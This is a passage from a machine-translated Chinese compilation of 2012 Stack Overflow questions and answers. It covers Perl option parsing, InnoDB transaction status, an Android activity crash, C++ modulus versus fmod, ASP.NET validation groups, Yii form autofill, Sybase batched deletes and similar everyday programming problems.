> 时间：2012-06-28T11:35:15.437

试试这个查询——在这种情况下你不需要一个`having`子句。

```
select item_id from scheduled_item 
    where is_played = 0 and 
    item_id in(
        select p.item_id from scheduled_item p 
             where p.animation_id = animation_id and 
             p.item_id < item_id and is_played = 1
    ) 
```

# perl - 使用 Perl 的 Getopt::Long，如何防止模块尝试匹配模棱两可的选项名称？

> ID：11243616
> 
> 赞同：5
> 
> 时间：2012-06-28T11:28:20.403
> 
> 标签：perl, getopt-long

我正在使用该[`Getopt::Long`](https://metacpan.org/module/Getopt%3a%3aLong)模块来处理命令行参数。

这个模块的典型行为是我们可以传递`-f`变量的全名而不是全名`--file`。同时，如果我有另一个命令行变量`--find`，并且仅`-f`在命令提示符处提供，它将返回错误：

```
Option f is ambiguous (file, find). 
```

我想知道我们如何才能遏制这种模棱两可的用法？

提前致谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-28T11:38:42.957

看看[`Getopt::Long`](https://metacpan.org/module/Getopt::Long#Configuring-Getopt::Long)文档：

> **自动缩写**
> 
> 允许将选项名称缩写为唯一性。除非设置了环境变量 POSIXLY_CORRECT，否则默认启用，在这种情况下 auto_abbrev 被禁用。

* * *

例子：

```
use strict;
use warnings;
use Getopt::Long qw(:config no_auto_abbrev);

my ( $file, $fish );

GetOptions( "file=s" => \$file, "fish=s" => \$fish ); 
```

和测试：

```
$ perl test.pl -fi 24
Unknown option: fi

$ perl test.pl -fis 24
Unknown option: fis 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:37:34.360

如果你想关闭这个自动缩写功能，你必须配置 Getopt::Long 使用

```
use Getopt::Long qw(:config no_auto_abbrev) ; 
```

# mysql - 在 SHOW ENGINE INNODB STATUS 中未启动事务是什么意思？

> ID：11243624
> 
> 赞同：7
> 
> 时间：2012-06-28T11:29:08.220
> 
> 标签：mysql, innodb, database-deadlocks

这是“SHOW ENGINE INNODB STATUS”的几行响应；

* * *

```
TRANSACTIONS
------------
Trx id counter 58EC54C6
Purge done for trx's n:o < 58EC54C3 undo n:o < 0
History list length 2420
LIST OF TRANSACTIONS FOR EACH SESSION:
---TRANSACTION 58EC51E6, not started
MySQL thread id 520131, OS thread handle 0x7f0db930e700, query id 24011015 108.89.56.87 xyz
---TRANSACTION 58EC527E, not started
MySQL thread id 520061, OS thread handle 0x7f0dbb596700, query id 24011370 108.89.56.87 xyz
---TRANSACTION 58EC53AC, not started
MySQL thread id 520065, OS thread handle 0x7f0dbb28a700, query id 24012094 108.89.56.87 xyz
---TRANSACTION 58EC50CE, not started
MySQL thread id 520109, OS thread handle 0x7f0dbba69700, query id 24010431 108.89.56.87 xyz    ---TRANSACTION 58EC51E8, not started
MySQL thread id 520123, OS thread handle 0x7f0dbb4d3700, query id 24011016 108.89.56.87 xyz    ---TRANSACTION 58EC51D0, not started
MySQL thread id 520072, OS thread handle 0x7f0db865c700, query id 24010944 108.89.56.87 xyz
---TRANSACTION 58EC5184, not started
MySQL thread id 520058, OS thread handle 0x7f0db8c74700, query id 24010807 108.89.56.87 xyz 
```

我想知道这个'Transaction transId，not started'是什么意思？是否有任何查询未能执行？

我正在使用innodb。我也没有手动开始交易。它正在考虑自动事务，因为我正在对具有批量数据的表发出更新查询。而且你在 5-10 分钟内会在这个单表上获得数百个 mysql 更新查询。

请让我知道“交易未开始”到底是什么意思？它是显示失败的查询还是只是一个正常的日志？

提前致谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-28T12:15:38.333

当一个线程（~connection）第一次需要在事务期间锁定一些数据时，就会创建一个事务“对象”（~context）。事务“对象”在事务结束时不会被销毁，如果新事务由同一线程启动，它将被重用。

每个事务显示为*当前*`not started`不在事务内部的线程拥有的事务“对象” （更准确地说，它不需要为事务维护单独的上下文）。

 *是在您发出 时在列`thread id`中显示的那个。`Id``SHOW PROCESSLIST`

这没什么好担心的，实际上这是正常行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T12:44:51.400

我在网上找到了这个：

> Innodb 什么时候开始事务？
> 
> 2011 年 1 月 11 日 作者：彼得·扎伊采夫
> 
> 9 条评论 inShare1
> 
> Innodb 什么时候开始事务？答案看起来很明显——当你发出“BEGIN”命令时。然而，从你的引擎角度来看，这是错误的答案。运行“SHOW INNODB STATUS”，您将在事务列表中看到“未启动”状态。

从[这里](http://www.mysqlperformanceblog.com/2011/01/11/when-does-innodb-start-transaction/)

> 对于 MySQL 的每个连接，如果此连接没有活动的 Innodb 事务，则将处于 ether not started 状态，如果事务处于活动状态，则将处于 ACTIVE 状态。即使连接处于“睡眠”阶段，注意事务也可以处于活动状态 - 如果它是多语句事务。Innodb 还将打印操作系统 thread_id 和进程 ID，如果您想使用 gdb 连接到正在运行的 mysqld 以进行故障排除和类似的事情，这可能会有所帮助。还报告事务状态，这基本上是事务正在执行的操作，它可以是“获取行”、“更新”和其他几个值。

[来源](http://www.mysqlperformanceblog.com/2006/07/17/show-innodb-status-walk-through/)_*

# integration - Testlink 1.9 和 Jira 集成错误

> ID：11243625
> 
> 赞同：1
> 
> 时间：2012-06-28T11:29:12.403
> 
> 标签：integration, jira

我遇到了 Testlink 问题 - 在报告和指标 - >失败的测试用例 - 无法查看任何结果 - 右侧框架出现致命错误

`Fatal error: require_once() [function.require]: Failed opening required 'ADODB_hsql.class.php' (include_path='.;C:\php\pear;.;C:\wamp\www\testlink_1_9_RC1\lib\functions\;C:\wamp\www\testlink_1_9_RC1\third_party\') in C:\wamp\www\testlink_1_9_RC1\lib\functions\common.php on line 96`

我还添加到 custom_config,inc.php：

```
$tlCfg->config_check_warning_mode = 'SILENT';   
$tlCfg->api->enabled = TRUE;             
$g_attachments->order_by = " ORDER BY id ASC "; 

$g_interface_bugs = 'JIRA'; 
```

并配置jira.cfg.php：

```
define('BUG_TRACK_DB_HOST', 'localhost:8100');

/** The name of the database that contains the jira tables */

define('BUG_TRACK_DB_NAME', 'jiradb');

/** The DB type being used by jira */

define('BUG_TRACK_DB_USER', 'admin');

/** The DB password to use for connecting to the jira db */

define('BUG_TRACK_DB_PASS', '<admin_password>');

/** link of the web server for jira */

define('BUG_TRACK_HREF', "http://localhost:8100/secure/Dashboard.jspa");

/** The DB type to use for connecting to the bugtracking db */

define('BUG_TRACK_DB_TYPE', 'hsql'); 
```

注意：如您所见，我使用 Jira 使用 hsql

任何想法如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T21:52:10.077

您只能使用 ADODB 支持的 DB TYPE，并且从错误消息看来，hsql 驱动程序不存在。我的建议是：为什么使用 stackoverflow 而不是 www.teamst.org ？

# java - 线程以未捕获的异常退出（组 = 0x40015560）

> ID：11243628
> 
> 赞同：0
> 
> 时间：2012-06-28T11:29:18.313
> 
> 标签：java, android

我正在尝试从`main.java`（启动屏幕）转到`Intro.java`我的 Android 应用程序中。但我收到以下错误...

```
thread exiting with uncaught exception (group=0x40015560) 
```

这是我的代码...

主.java：

```
public class main extends Activity {
/** Called when the activity is first created. */

boolean _active = true;
final int _splashTime = 2000; // time to display the splash screen in ms

@Override
public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.splash);

    // thread for displaying the SplashScreen
    Thread splashTread = new Thread()
    {
        @Override
        public void run()
        {
            try {
                int waited = 0;
                while(_active && (waited < _splashTime)) {
                    sleep(100);

                    // waited is incremented by 100 after every sleep for 100 ms
                    if(_active) {
                        waited += 100;
                    }
                }
            } 
            catch(InterruptedException e) {

            }
            finally {

                    finish();

                    Intent inte = new Intent(main.this, Intro.class);
                    startActivity(inte);
                    }
        }
    };

    splashTread.start();

}
// this is to skip splash screen by touch event
@Override
public boolean onTouchEvent(MotionEvent event) {
    if (event.getAction() == MotionEvent.ACTION_DOWN) {
        _active = false;
    }
    return true;
}

} 
```

介绍.java

```
public abstract class Intro extends Activity implements OnClickListener
{
/** Called when the activity is first created. */

@Override
public void onCreate(Bundle savedInstanceState) 
{
    Log.d("Error"," Intro Started ");
    super.onCreate(savedInstanceState);
    setContentView(R.layout.intro);

     RelativeLayout layout = (RelativeLayout) findViewById(R.layout.intro);
     layout.setOnTouchListener(new OnTouchListener() {

    @Override
    public boolean onTouch(View arg0, MotionEvent arg1)
    {
         Log.d("Error"," Touch Listener set "); 

        Intent i=new Intent(Intro.this,features.class);  
        startActivity(i);
        return false;
    }

});
}
} 
```

intro.java 应该通过用户的触摸进入 features.java ......

清单文件

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.ubuntu.app"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk android:minSdkVersion="10" />

<application
    android:icon="@drawable/ubundroid"
    android:label="@string/app_name" >
    <activity
        android:name=".main"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <activity   android:name=".Intro" />
    <activity   android:name=".Feature"/>
</application>

</manifest> 
```

日志猫：

```
 D/dalvikvm(1229): newInstance failed: p0 i0 [0 a1
 D/AndroidRuntime(1229): Shutting down VM
W/dalvikvm(1229): threadid=1: thread exiting with uncaught exception (group=0x40015560)
 E/AndroidRuntime(1229): FATAL EXCEPTION: main
 E/AndroidRuntime(1229): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.ubuntu.app/        com.ubuntu.app.Intro}: java.lang.InstantiationException: com.ubuntu.app.Intro
 E/AndroidRuntime(1229):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1569)
E/AndroidRuntime(1229):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
E/AndroidRuntime(1229):     at android.app.ActivityThread.access$1500(ActivityThread.java:117)
E/AndroidRuntime(1229):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
 E/AndroidRuntime(1229):    at android.os.Handler.dispatchMessage(Handler.java:99)
E/AndroidRuntime(1229):     at android.os.Looper.loop(Looper.java:123)
 E/AndroidRuntime(1229):    at android.app.ActivityThread.main(ActivityThread.java:3683)
 E/AndroidRuntime(1229):    at java.lang.reflect.Method.invokeNative(Native Method)
 E/AndroidRuntime(1229):    at java.lang.reflect.Method.invoke(Method.java:507)
E/AndroidRuntime(1229):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
E/AndroidRuntime(1229):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
E/AndroidRuntime(1229):     at dalvik.system.NativeStart.main(Native Method)
 E/AndroidRuntime(1229): Caused by: java.lang.InstantiationException: com.ubuntu.app.Intro
E/AndroidRuntime(1229):     at java.lang.Class.newInstanceImpl(Native Method)
 E/AndroidRuntime(1229):    at java.lang.Class.newInstance(Class.java:1409)
 E/AndroidRuntime(1229):    at android.app.Instrumentation.newActivity(Instrumentation.java:1021)
 E/AndroidRuntime(1229):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1561)
 E/AndroidRuntime(1229):    ... 11 more 
```

提前致谢...

============================已编辑====================== ================

当我删除 Intro.java 中的所有触摸事件时，它开始运行。新的 java 文件是：

```
package com.ubuntu.app;

import android.app.Activity;

import android.os.Bundle;
import android.util.Log;

public  class Intro extends Activity
{
/** Called when the activity is first created. */

@Override
public void onCreate(Bundle savedInstanceState) 
{
    Log.d("Error"," Intro Started ");
    super.onCreate(savedInstanceState);
    setContentView(R.layout.intro);

}
} 
```

但我想通过触摸用户来获得进入下一个活动的正确方法..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:31:13.583

采用

```
Intent i=new Intent(Intro.this,Feature.class);  
        startActivity(i); 
```

代替

```
 Intent i=new Intent(Intro.this,features.class);  
        startActivity(i); 
```

或者，如果 features 是您的 Activity，那么也将其注册为清单：

```
<activity   android:name=".features"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:31:06.873

*   无法实例化活动 ComponentInfo{
    com.ubuntu.app/com.ubuntu.app.Intro}：java.lang.InstantiationException：com.ubuntu.app.Intro

..

```
public abstract class Intro extends Activity implements OnClickListener 
```

intro 是一个抽象类，不能让它成为实例，所以当你启动这个类时，android 会尝试创建它的实例，这会给出错误

我想我必须编写代码

```
public  class Intro extends Activity implements OnClickListener
{
/** Called when the activity is first created. */

@Override
public void onCreate(Bundle savedInstanceState) 
{
    Log.d("Error"," Intro Started ");
    super.onCreate(savedInstanceState);
    setContentView(R.layout.intro);

}

public void onClick(View v) {
    //handle button event 
} 
} 
```

# c++ - % 与 FMOD 用于计算模量

> ID：11243632
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:29:57.487
> 
> 标签：c++, windows, visual-studio-2010, visual-studio, console-application

我的控制台应用程序看起来像这样。

```
#include "stdafx.h"
#include <iostream>
#include <cmath>
using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{
    int a, b;
    cin>>a>>b;
    cout<<"% "<<a%b<<endl<<"fmod "<<fmod(a,b)<<endl;
    system("pause");
    return 0;
} 
```

我是 C++ 的新手，我有 2 个问题：

1.  在 VS 上编写此应用程序。为什么我需要包含“stdafx.h”？有什么要求吗？这是什么？
2.  `fmod`和有什么区别`%`吗？为他们获得完全相同的结果：

![在此处输入图像描述](../Images/e044a3c18c62c4e29233b7d341832cf7.png)

提前谢谢..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:34:16.403

> 在 VS 上编写此应用程序。为什么我需要包含“stdafx.h”？有什么要求吗？这是什么？

因为默认的项目设置说你需要预编译的头文件（见[这个](https://stackoverflow.com/questions/2976035/purpose-of-stdafx-h)）。

您可以手动禁用此功能。选择**不使用预编译头**，如下图所示：

![在此处输入图像描述](../Images/e7c330c551d1d8db84942e6b57f3216f.png)

* * *

> fmod 和 % 之间有什么区别吗？为他们获得完全相同的结果：

是的。`%`不能对浮点数进行操作，而`fmod`可以。`f`in[`fmod`](http://en.cppreference.com/w/cpp/numeric/math/fmod)表示浮点数。

试试这个：

```
float a, b;
std::cin>>a>>b;
std::cout << (a%b) << std::endl; //it will give compilation error. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-03T21:11:21.327

fmod( a , b ) 将在传递参数时将 int 变量 a 和 b 转换为浮点数。根据 a 和 b 的类型（例如，如果您使用 std::uint64_t），您可能会在强制转换期间失去精度并返回不正确的内容。返回类型也将是浮点数，如果您使用具有 int 类型的函数，则需要再次强制转换。对于 int 类型，您应该坚持使用 % 。使用 fmod 效率较低。

# c# - 不同 usercontrol.ascx 中的两个验证按钮

> ID：11243633
> 
> 赞同：2
> 
> 时间：2012-06-28T11:29:57.567
> 
> 标签：c#, asp.net, user-controls

我需要通过单击按钮1验证两个单独的组，另一个是单击按钮2 两个按钮在同一页面中实现的单独用户控件中，对第一个用户控件的验证也验证第二个，我为两者提供验证组用户单独控制它不起作用。请帮我...

下面的代码包含两个用户控件，一个按钮在，另一个按钮 `< uc1:UCEditRegisterUser>`在`< uc1:UCEditDoctorProfile>`

```
<div style="width: 950px; margin: 0px auto 0px auto;">
        <div style="width: 425px; min-height: 800px; overflow: hidden; float: left; padding-left: 17px;
            margin-top: 30px;">
            <uc1:UCEditRegisterUser ID="UCEditRegisterUser1" runat="server" />
        </div>
 <div style="width: 485px; min-height: 800px; overflow: hidden; float: right; margin-top: 30px;
            padding-right: 20px;">
            <uc1:UCEditDoctorProfile ID="UCEditDoctorProfile1" runat="server" />
        </div>
    </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:44:32.720

这似乎很明显，所以道歉

1.  确保两个用户组内验证器上的验证组完全相同
2.  确保触发验证的按钮（或其他）也具有相同的验证组
3.  确保触发按钮没有将`CausesValidation`属性设置为 false

您可以考虑使 ValidationGroup 成为在两个控件上外部设置的属性。可能会让所有继承您的代码的人都清楚

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-05T05:39:00.840

我得到了解决方案，它需要从页面事件 Page_ClientValidate("pwd"); 调用验证 括号中的密码是验证组。

```
<script type="text/javascript">
function ValidateUserContrlos()
{
 var isValid=false;

  isValid=Page_ClientValidate("pwd");

if(isValid)
{
 return true; 
}
else
 return false;

 }
</script> 
```

从按钮单击调用函数，如下所示

```
<asp:Button ID="btnSave" runat="server" Text="Save" onClick="btnSave_Click"  
  OnClientClick="return ValidateUserContrlos()"/>. 
```

解决了。​​。谢谢大家的支持。。

# database - 外键为空是否有效？

> ID：11243634
> 
> 赞同：0
> 
> 时间：2012-06-28T11:29:58.480
> 
> 标签：database

外键为空是否有效？我刚刚创建了一个与另一个表有外键关系的表。但是我可以在不指定外键的情况下将值插入表中！

外键可以为空吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:35:54.110

一般来说，是的，它是有效的。

这取决于您要建模的内容。

*如果您拥有*的实体不必链接到外键表实体（1 或无关系），则允许外键列为空即可。

如果不是这种情况（并且关系始终是 1 对 1），那么这不应该被允许并且外键列定义应该有`NOT NULL`.

# php - 自动完成先前值的字段

> ID：11243640
> 
> 赞同：1
> 
> 时间：2012-06-28T11:30:17.497
> 
> 标签：php, mysql, yii, yii-events

我正在[Yii 框架](http://www.yiiframework.com/)中做一个小应用程序，因为我的数据库是这样的

```
 === Invoices ===
  id (PK)
  customer_id
  invoice_title
  order_no
  invoice_issue_date
  due_date
  description

  === Customers ===
  id (PK)
  email_address
  customer_name
  address
  city
  state
  postal_code
  description 
```

我已经渲染了`Customer model`in`Invoice model`以便我可以在一个中输入两个模型的所有值`single Invoice form`。但是有一个问题，让我们假设我有一个客户名称`xyz`。`saved before`现在当我要去的时候`again fill the Customer name with xyz`，它应该显示`all the fields of both models like invoice_title,order_no,invoice_issue_date,due_date,description,email_address,customer_name,address etc. in that input fields of the form`出来我不必`re-enter all the fields again`。所以如何在 Yii 框架中实现这一点。任何帮助和建议都将是非常可观的。如果需要，可以分享我所做的代码的更多说明。请帮帮我。我完全被困在这里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-06T16:35:30.827

正如大家已经提到的那样，要做到这一点，您需要 ajax 和一些 javascript。逻辑是这样的：

1.  在客户名称的下拉列表中选择一个值时，触发 ajax 调用以检索有关该用户的信息。这可以通过 ajax 选项轻松完成，该选项可用作 CHtml 中某些 html 元素助手的附加 htmlOption，作为[clientChange](http://www.yiiframework.com/doc/api/1.1/CHtml#clientChange-detail "http://www.yiiframework.com/doc/api/1.1/CHtml#clientChange-detail")的一部分。

    ```
    echo $form->dropDownList($model,'customer_name',CHtml::listData(Customers::model()->findAll(),'id','customer_name'),
       array(// htmlOptions
         'ajax'=>array(// special htmlOption through clientChange, for ajax
               'type'=>'GET', 
               'url'=>$this->createUrl('controllername/customerdetails'),// action that will generate the data
               'data'=>'js:"id="+$(this).val()',// this is the data that we are sending to the action in the controller
               'dataType'=>'json',// type of data we expect back from the server
               'success'=>'js:updateFields'// a javascript function that will execute when the request completes successfully
         )
       )
     ); 
    ```

    上述 ajax 选项的文档可以在[jquery 的 ajax 文档](http://api.jquery.com/jQuery.ajax/ "http://api.jquery.com/jQuery.ajax/")中看到。

2.  然后在服务器端找到特定的客户，并向浏览器发送响应。例子：

    ```
    // in the controllername code an action that will return the values as json
    public function actionCustomerdetails($id){
        $var=Customers::model()->findByPk($id);
        echo CJSON::encode($var);
    } 
    ```

3.  当您收到服务器响应时，填充相应的字段。这可以在 ajax 的成功函数回调中完成，在上面的代码中是 updateFields：

    ```
    Yii::app()->clientScript->registerScript('update','
        function updateFields(data, textStatus, jqXHR){
            // select each input field by id, and update its value
            $("#Customers_postal_code").val(data.postal_code);
            $("#Customers_city").val(data.city);
            $("#Customers_address").val(data.address);
            // similarly update the fields for the other inputs
        }
    '); 
    ```

注意：您的客户可以有许多发票，因此问题将是在给定客户名称的情况下选择哪张发票。这是你必须处理的事情，我认为我的答案有足够的代码让你继续前进。

要知道输入字段 id，您可以简单地检查生成的 html。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-01T07:18:12.853

您可以分两个阶段执行此操作，以便：

1.  最初显示视图时，会要求客户提供他们的`email address`或`customer_name`。

2.  表单提交到的控制器操作然后从客户模型中检索提交的数据`email address`或`customer_name`（我将`email_address`在下面的示例中使用）。检索后，您可以显示您的单一发票表单视图，其中包含为客户预先填充的数据（如果有）。

然后可以按如下方式实现此概念：

```
<?php
// file: controllers/InvoiceController.php
class InvoiceController extends CController
{
  // ... other controller functions

  public function actionCreate($step = null)
  {
    $invoice  = new Invoice;
    $customer = new Customer;

    # Form has been submitted:
    if ( isset($_POST['Customer']) )
    {
      # The submitted form was Step 1:
      if ( $step == 1 )
      {
        # make sure the submitted email address is valid
        $customer->setAttributes($_POST['Customer']);
        if ( $customer->validate(array('email_address')) )
        {
          # retrieve the customer by email_address
          $customer = Customer::model()->findByAttributes(array('email_address' => $_POST['Customer']['email_address']));
        }

        $this->render('createstep2', array('invoice' => $invoice, 'customer' => $customer));
      }

      # The submitted form was Step 2:
      elseif ( $step == 2 )
      {
        $income->setAttributes($_POST['Invoice']);
        $customer->setAttributes($_POST['Customer']);

        # save the data
        if ( $customer->save() )
        {
          $invoice->customer_id = $customer->id;
          if ( $invoice->save() )
          {
            $this->redirect(array('view', 'id' => $invoice->id));
          }
        }

        # display any errors
        $this->render('createstep2', array('invoice' => $invoice, 'customer' => $customer));
      }
    } 

    $this->render('createstep1', array('invoice' => $invoice, 'customer' => $customer));
  }

  // ... other controller functions
}
?> 
```

如果您愿意，可以将其拆分为两个单独的控制器操作。

对于第 1 步视图，您可以拥有以下内容：

```
<!-- file: views/invoice/createstep1.php -->
<h1>Create Invoice: Step 1</h1>

<div class="form">

<?php
$form = $this->beginWidget('CActiveForm', array(
  'id'=>'invoice-form',
  'enableAjaxValidation'=>false,
  'action'=>array('invoice/create','step' => 1)
)); 
?>

  <?php echo $form->errorSummary($customer); ?>

  <div class="row">
    <?php echo $form->labelEx($customer,'email_address'); ?>
    <?php echo $form->textField($customer,'email_address', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'email_address'); ?>
  </div>

  <div class="row buttons">
    <?php echo CHtml::submitButton('Next'); ?>
  </div>

<?php $this->endWidget(); ?>

</div><!-- form --> 
```

第 2 步查看，然后您可能看起来就像您已经拥有的一样。也许是这样的：

```
<!-- file: views/invoice/createstep2.php -->
<h1>Create Invoice: Step 2</h1>

<div class="form">

<?php
$form = $this->beginWidget('CActiveForm', array(
  'id'=>'invoice-form',
  'enableAjaxValidation'=>false,
  'action'=>array('invoice/create','step' => 2)
)); 
?>

  <?php echo $form->errorSummary($invoce); ?>
  <?php echo $form->errorSummary($customer); ?>

  <h2>Customer Details</h2>
  <div class="row">
    <?php echo $form->labelEx($customer,'email_address'); ?>
    <?php echo $form->textField($customer,'email_address', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'email_address'); ?>
  </div>

  <!-- If the customer already exists, these field should be pre-populated: -->

  <div class="row">
    <?php echo $form->labelEx($customer,'customer_name'); ?>
    <?php echo $form->textField($customer,'customer_name', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'customer_name'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($customer,'address'); ?>
    <?php echo $form->textField($customer,'address', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'address'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($customer,'city'); ?>
    <?php echo $form->textField($customer,'city', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'city'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($customer,'state'); ?>
    <?php echo $form->textField($customer,'state', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'state'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($customer,'postal_code'); ?>
    <?php echo $form->textField($customer,'postal_code', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'postal_code'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($customer,'description'); ?>
    <?php echo $form->textField($customer,'description', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($customer,'description'); ?>
  </div>

  <h2>Order Details</h2>

  <div class="row">
    <?php echo $form->labelEx($invoice,'invoice_title'); ?>
    <?php echo $form->textField($invoice,'invoice_title', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($invoice,'invoice_title'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($invoice,'order_no'); ?>
    <?php echo $form->textField($invoice,'order_no', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($invoice,'order_no'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($invoice,'invoice_issue_date'); ?>
    <?php $form->widget('zii.widgets.jui.CJuiDatePicker', array(
        'model'     => $invoice,
        'attribute' => 'invoice_issue_date',
        'value'     => $invoice->invoice_issue_date,
        'options'   => array(
          'showButtonPanel' => false,
          'changeYear'      => true,
          'dateFormat'      => 'yy-mm-dd',
        ),
      )); ?>
    <?php echo $form->error($invoice,'invoice_issue_date'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($invoice,'due_date'); ?>
    <?php $form->widget('zii.widgets.jui.CJuiDatePicker', array(
        'model'     => $invoice,
        'attribute' => 'due_date',
        'value'     => $invoice->due_date,
        'options'   => array(
          'showButtonPanel' => false,
          'changeYear'      => true,
          'dateFormat'      => 'yy-mm-dd',
        ),
      )); ?>
    <?php echo $form->error($invoice,'due_date'); ?>
  </div>

  <div class="row">
    <?php echo $form->labelEx($invoice,'description'); ?>
    <?php echo $form->textField($invoice,'description', array('size'=>60,'maxlength'=>255)); ?>
    <?php echo $form->error($invoice,'description'); ?>
  </div>

  <div class="row buttons">
    <?php echo CHtml::submitButton('Create'); ?>
  </div>

<?php $this->endWidget(); ?>

</div><!-- form --> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T12:39:49.067

你检查过 Yii 自动完成小部件吗？而且您不必担心 AJAX 的实现。它为你做。

[Yii 框架：CJui 自动完成](http://www.yiiframework.com/wiki/162/a-simple-action-for-cjuiautocomplete/)

此链接中更定制的自动完成解决方案。

[Yii 框架：自定义自动完成显示和值提交](http://www.yiiframework.com/wiki/217/custom-autocomplete-display-and-value-submission/)

# sql - 非常大的“delete from”语句，“where”关闭，我应该优化吗？

> ID：11243643
> 
> 赞同：1
> 
> 时间：2012-06-28T11:30:29.873
> 
> 标签：sql, database, sybase

我有一个经典的“销售”数据库，其中包含某些表中的数百万行。在这些大表中的每一个上，我都有一个关联的“删除”触发器和“备份”表。

此备份表在过去 7 天内保留“已删除”行：触发器首先将已删除的行复制到该备份表中，然后将以这种方式在备份中执行删除：

```
CREATE TRIGGER dbo.TRIGGER
ON dbo.EXAMPLE_DATA
FOR DELETE AS
INSERT INTO EXAMPLE_BACKUP
select getDate(), *
from deleted
DELETE from EXAMPLE_BACKUP
where modified < dateadd(dd, -7, getDate()) 
```

备份表的结构类似于原始数据表（键、值）。唯一的区别是我在备份表中添加了一个“已修改”字段，我将其集成到密钥中。

我的一位同事告诉我应该使用“循环”，因为一旦备份表包含数百万行，我的删除语句就会导致超时/问题。该删除实际上会在某个时候爆炸吗？我应该以不同的方式做某事吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:49:43.420

看起来 Sybase 12.5 支持表分区；如果您的设计使得数据可以保留 7 天（使用硬断点），您可以在一年中的某一天对表进行分区，并构建一个视图来表示当前数据。随着时钟在某一天滴答作响，您可以显式地截断较旧的分区。

只是一个想法。

[http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.dc20020_1251/html/databases/X15880.htm](http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.dc20020_1251/html/databases/X15880.htm)

否则，循环删除是一种合理的方法，可以在不破坏事务日志的情况下删除大量数据。这是使用 SQL Server 的一种方法：

[http://sqlserverperformance.wordpress.com/2011/08/13/gradually-deleting-data-in-sql-server/](http://sqlserverperformance.wordpress.com/2011/08/13/gradually-deleting-data-in-sql-server/)

# java - Java Pattern.quote

> ID：11243644
> 
> 赞同：0
> 
> 时间：2012-06-28T11:30:40.060
> 
> 标签：java, regex, pattern-matching

我对 Patterns 很陌生，一些帮助会很棒。

我正在构建一个网络爬虫，它在路径中查找特定模式。

现在我正在使用`Pattern.quote`生成一个文字字符串。

假设 Pattern.quote 产生`\Q/test/live/167909\E`其中第二个斜线（因此活）之后总是相同的。因为`test`and`167909`是随机的，所以我创建了这个模式`\Q/*/live/*\E`，但我不能用它来创建一个新的模式。

欢迎任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:47:07.613

该表达式`".*/live/.*"`将路径与您描述的模式匹配。你可以用它创建一个模式。

或者，正如彼得所说，你可以简单地问`path.contains("/live/");`

# c# - 在 .NET 中以编程方式编写 CSS

> ID：11243645
> 
> 赞同：1
> 
> 时间：2012-06-28T11:30:41.883
> 
> 标签：c#, asp.net, css, vb.net, htmltextwriter

我们在网页中显示具有基本高度和宽度属性的对象。我们可以使用 HtmlTextWriter 对象生成 HTML 对象，并计划通过在类顶部的嵌入式 css 类中引用对象的 ID 来应用 Height 和 Width 属性。

```
#bob
{
   height: 20
   width: 20
} 
```

...

```
<div id="bob"></div> 
```

1）首先，这是一个好方法还是我们应该考虑另一种方法，如内联 css ？

2）似乎没有任何东西写在.net框架内渲染css的surrort中。有谁知道任何可能有助于使用 .net 框架呈现 css 符号的内容。有没有等价物`HtmlTextWriter`？

3）你知道任何可以帮助从代码生成css的工具吗？

亲切的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:50:11.937

